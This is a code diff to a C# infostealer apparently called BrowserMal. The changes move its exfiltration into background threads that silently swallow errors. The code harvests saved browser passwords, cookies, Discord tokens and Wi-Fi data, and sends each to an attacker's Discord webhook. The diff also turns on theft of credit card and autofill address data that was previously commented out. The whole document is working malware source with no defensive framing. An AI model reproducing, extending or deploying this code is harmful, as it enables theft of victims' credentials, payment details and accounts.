@@ -4,9 +4,8 @@ using BrowserMal.Manager;
 using BrowserMal.Model;
 using BrowserMal.Util;
 using BrowserMal.Discord;
-using BrowserMal.Discord.Model;
-using System.Text;
-using System.Windows.Forms;
+using System.Threading;
+using System;
 
 namespace BrowserMal
 {
@@ -16,57 +15,100 @@ namespace BrowserMal
         private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
         private static readonly Dictionary<string, string> list = new Dictionary<string, string>();
 
-        public static void StartCreds(string discordWebhook, bool extractWifi = false)
+        public static void StartCreds(string discordWebhook, bool extractWifi)
         {
             if (string.IsNullOrEmpty(discordWebhook))
                 return;
 
+            SystemInfoDiscordMessage(discordWebhook);
+
             browserManager.Init();
-            List<BrowserModel> browsersChromium = browserManager.GetBrowsers();
-
             geckoBrowserManager.Init();
-            List<BrowserModel> browsersGecko = geckoBrowserManager.GetBrowsers();
 
-            Chromium(ref browsersChromium);
-            Gecko(ref browsersGecko);
-
-            DiscordManager discordManager = new DiscordManager();
-            List<BrowserModel> discordPaths = discordManager.GetDiscordLocations();
-
-            //List<string> discordsTokensBrowser = discordManager.Init(ref browsersChromium, ChromiumUtil.LOCAL_STORAGE);
-
-            DiscordManager.Encrypted = true;
-            List<string> discordTokensApp = discordManager.Init(ref discordPaths, ChromiumUtil.LOCAL_STORAGE);
-
-            CreateSimpleDiscordMessage(discordWebhook, string.Join(", ", discordTokensApp.ToArray()));
-            //Extration();
+            BrowserDump(discordWebhook);
+            DiscordTokenDump(discordWebhook);
 
             if (extractWifi)
             {
-                Wifi.Enumerate enumerate = new Wifi.Enumerate();
-                Webhook.SendFile(enumerate.Start(), discordWebhook, "wifi.json");
+                WifiDump(discordWebhook);
             }
-
-            //CreateSimpleDiscordMessage(discordWebhook, sb.ToString());
-            DiscordExtration(discordWebhook);
-            CreateDiscordMessage(discordWebhook);
 
             //Filesaver.FileManager.SaveBytes(@"", Zip.ZipArchives(list));
             //ProcessUtil.KillProcessDelayed(1, "powershell.exe");
         }
 
+        private static void DiscordTokenDump(string discordWebhook)
+        {
+            new Thread(() =>
+            {
+
+                DiscordManager discordManager = new DiscordManager();
+                List<BrowserModel> discordPaths = discordManager.GetDiscordLocations();
+
+                DiscordManager.Encrypted = true;
+                List<string> discordTokensApp = discordManager.Init(ref discordPaths, ChromiumUtil.LOCAL_STORAGE);
+
+                foreach (string token in discordTokensApp)
+                {
+                    CreateUserTokenMessage(discordWebhook, token);
+                }
+
+            }).Start();
+        }
+
+        private static void BrowserDump(string discordWebhook)
+        {
+            new Thread(() =>
+            {
+                Chromium();
+                Gecko();
+
+                DiscordExtration(discordWebhook);
+
+            }).Start();
+        }
+
+        private static void SystemInfoDiscordMessage(string discordWebhook)
+        {
+            new Thread(() =>
+            {
+                CreateDiscordMessage(discordWebhook);
+            }).Start();
+        }
+
+        private static void WifiDump(string discordWebhook)
+        {
+            new Thread(() =>
+            {
+                Wifi.Enumerate enumerate = new Wifi.Enumerate();
+                Webhook.SendFile(enumerate.Start(), discordWebhook, "wifi.json");
+            }).Start();
+        }
+
         private static void CreateDiscordMessage(string discordWebhook)
         {
-            DiscordMessageManager discordMessageManager = new DiscordMessageManager();
-            Webhook.Send(discordMessageManager.CreateMessage(color: 0xf50fd6, username: "Brobot"), discordWebhook);
+            try
+            {
+                DiscordMessageManager discordMessageManager = new DiscordMessageManager();
+                Webhook.Send(discordMessageManager.CreateMessage(color: 0xf50fd6, username: "Brobot"), discordWebhook);
+            }
+            catch(Exception)
+            {
+            }
         }
 
-        private static void CreateSimpleDiscordMessage(string discordWebhook, string content)
+        private static void CreateUserTokenMessage(string discorWebhook, string discordToken)
         {
-            DiscordMessageManager discordMessageManager = new DiscordMessageManager();
-            Webhook.Send(discordMessageManager.CreateSimpleMessage("Brobot", content), discordWebhook);
+            try
+            {
+                DiscordMessageManager discordMessageManager = new DiscordMessageManager();
+                Webhook.Send(discordMessageManager.CreateMessage(color: 0xf50fd6, username: "Brobot", discordToken), discorWebhook);
+            }
+            catch (Exception)
+            {
+            }
         }
-
+       
         private static void DiscordExtration(string url) => Webhook.BulkSend(list, url);
 
         private static void Extration()
@@ -79,8 +121,10 @@ namespace BrowserMal
             Filesaver.FileManager.SaveBytes(root, "loot", Zip.ZipArchives(list));
         }
 
-        private static void Chromium(ref List<BrowserModel> browsers)
+        private static void Chromium()
         {
+            var browsers = browserManager.GetBrowsers();
+
             List<ColumnModel> credsColumns = new List<ColumnModel>
             {
                 new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
@@ -103,7 +147,7 @@ namespace BrowserMal
             list.AddRange(cookiesManager.Init(ref browsers, ChromiumUtil.COOKIES));
 
             // get credit cards
-            /*List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
+            List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
             {
                 new ColumnModel("name_on_card", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("expiration_month", isEncrypted: false, needsFormatting: false, isImportant: false),
@@ -121,11 +165,13 @@ namespace BrowserMal
                 new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
             };
             ChromiumManager<AddressesModel> addressesManager = new ChromiumManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns));
-            list.AddRange(addressesManager.Init(ref browsers, ChromiumUtil.WEB_DATA));*/
+            list.AddRange(addressesManager.Init(ref browsers, ChromiumUtil.WEB_DATA));
         }
 
-        public static void Gecko(ref List<BrowserModel> browsers)
+        public static void Gecko()
         {
+            var browsers = geckoBrowserManager.GetBrowsers();
+
             GeckoManager<CredentialModel> geckoManager = new GeckoManager<CredentialModel>("logins.json", default);
             list.AddRange(geckoManager.Init(ref browsers));
 
